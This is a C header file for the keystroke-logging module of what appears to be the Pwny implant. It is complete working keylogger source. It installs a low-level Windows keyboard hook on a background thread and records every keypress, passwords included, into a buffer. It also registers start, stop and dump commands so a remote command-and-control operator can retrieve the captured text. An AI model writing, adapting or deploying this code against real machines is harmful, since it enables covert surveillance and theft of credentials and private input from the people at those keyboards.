/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _KEYSCAN_H_
#define _KEYSCAN_H_

#include <windows.h>
#include <string.h>

#include <pwny/tlv.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/log.h>

#define KEYSCAN_BASE 11

#define KEYSCAN_START \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       KEYSCAN_BASE, \
                       API_CALL)
#define KEYSCAN_STOP \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       KEYSCAN_BASE, \
                       API_CALL + 1)
#define KEYSCAN_DUMP \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       KEYSCAN_BASE, \
                       API_CALL + 2)

#define TLV_TYPE_KEYSCAN_DATA TLV_TYPE_CUSTOM(TLV_TYPE_STRING, KEYSCAN_BASE, API_TYPE)

#define KEYSCAN_BUF_SIZE 65536

static HHOOK keyscan_hook = NULL;
static HANDLE keyscan_thread = NULL;
static char keyscan_buffer[KEYSCAN_BUF_SIZE];
static volatile LONG keyscan_offset = 0;
static CRITICAL_SECTION keyscan_cs;
static volatile int keyscan_running = 0;

static void keyscan_append(const char *text)
{
    size_t len = strlen(text);

    EnterCriticalSection(&keyscan_cs);

    if (keyscan_offset + len < KEYSCAN_BUF_SIZE - 1)
    {
        memcpy(keyscan_buffer + keyscan_offset, text, len);
        keyscan_offset += (LONG)len;
        keyscan_buffer[keyscan_offset] = '\0';
    }

    LeaveCriticalSection(&keyscan_cs);
}

static LRESULT CALLBACK keyscan_ll_proc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        BYTE keyState[256];
        WCHAR unicodeChar[4];
        char utf8[16];
        int ret;

        memset(keyState, 0, sizeof(keyState));
        GetKeyboardState(keyState);

        /* Handle special keys */
        switch (kb->vkCode)
        {
            case VK_RETURN:  keyscan_append("<CR>"); goto done;
            case VK_TAB:     keyscan_append("<Tab>"); goto done;
            case VK_BACK:    keyscan_append("<BS>"); goto done;
            case VK_ESCAPE:  keyscan_append("<Esc>"); goto done;
            case VK_DELETE:  keyscan_append("<Del>"); goto done;
            case VK_INSERT:  keyscan_append("<Ins>"); goto done;
            case VK_LEFT:    keyscan_append("<Left>"); goto done;
            case VK_RIGHT:   keyscan_append("<Right>"); goto done;
            case VK_UP:      keyscan_append("<Up>"); goto done;
            case VK_DOWN:    keyscan_append("<Down>"); goto done;
            case VK_HOME:    keyscan_append("<Home>"); goto done;
            case VK_END:     keyscan_append("<End>"); goto done;
            case VK_PRIOR:   keyscan_append("<PgUp>"); goto done;
            case VK_NEXT:    keyscan_append("<PgDn>"); goto done;
            case VK_LWIN:
            case VK_RWIN:    keyscan_append("<Win>"); goto done;
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL:
            case VK_MENU:
            case VK_LMENU:
            case VK_RMENU:
            case VK_CAPITAL:
                goto done; /* Skip modifier-only presses */
        }

        /* Handle F-keys */
        if (kb->vkCode >= VK_F1 && kb->vkCode <= VK_F24)
        {
            char fkey[8];
            _snprintf(fkey, sizeof(fkey), "<F%d>", kb->vkCode - VK_F1 + 1);
            keyscan_append(fkey);
            goto done;
        }

        /* Convert to Unicode character */
        ret = ToUnicode(kb->vkCode, kb->scanCode, keyState, unicodeChar,
                        sizeof(unicodeChar) / sizeof(WCHAR), 0);
        if (ret > 0)
        {
            int utf8_len = WideCharToMultiByte(CP_UTF8, 0, unicodeChar, ret,
                                               utf8, sizeof(utf8) - 1, NULL, NULL);
            if (utf8_len > 0)
            {
                utf8[utf8_len] = '\0';
                keyscan_append(utf8);
            }
        }
    }

done:
    return CallNextHookEx(keyscan_hook, nCode, wParam, lParam);
}

static DWORD WINAPI keyscan_thread_proc(LPVOID param)
{
    MSG msg;

    (void)param;

    keyscan_hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyscan_ll_proc, NULL, 0);
    if (keyscan_hook == NULL)
    {
        log_debug("* SetWindowsHookEx failed (%lu)\n", GetLastError());
        return 1;
    }

    keyscan_running = 1;

    while (GetMessageA(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    return 0;
}

static tlv_pkt_t *keyscan_start(c2_t *c2)
{
    if (keyscan_running)
    {
        return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    }

    InitializeCriticalSection(&keyscan_cs);
    keyscan_offset = 0;
    memset(keyscan_buffer, 0, KEYSCAN_BUF_SIZE);

    keyscan_thread = CreateThread(NULL, 0, keyscan_thread_proc, NULL, 0, NULL);
    if (keyscan_thread == NULL)
    {
        DeleteCriticalSection(&keyscan_cs);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Wait briefly for hook to install */
    Sleep(100);

    if (!keyscan_running)
    {
        WaitForSingleObject(keyscan_thread, 1000);
        CloseHandle(keyscan_thread);
        keyscan_thread = NULL;
        DeleteCriticalSection(&keyscan_cs);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *keyscan_stop(c2_t *c2)
{
    if (!keyscan_running)
    {
        return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    }

    keyscan_running = 0;

    if (keyscan_hook)
    {
        UnhookWindowsHookEx(keyscan_hook);
        keyscan_hook = NULL;
    }

    if (keyscan_thread)
    {
        PostThreadMessage(GetThreadId(keyscan_thread), WM_QUIT, 0, 0);
        WaitForSingleObject(keyscan_thread, 5000);
        CloseHandle(keyscan_thread);
        keyscan_thread = NULL;
    }

    DeleteCriticalSection(&keyscan_cs);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *keyscan_dump(c2_t *c2)
{
    tlv_pkt_t *result;

    if (!keyscan_running)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    EnterCriticalSection(&keyscan_cs);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_string(result, TLV_TYPE_KEYSCAN_DATA, keyscan_buffer);

    keyscan_offset = 0;
    memset(keyscan_buffer, 0, KEYSCAN_BUF_SIZE);

    LeaveCriticalSection(&keyscan_cs);

    return result;
}

void register_keyscan_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, KEYSCAN_START, keyscan_start);
    api_call_register(api_calls, KEYSCAN_STOP, keyscan_stop);
    api_call_register(api_calls, KEYSCAN_DUMP, keyscan_dump);
}

#endif
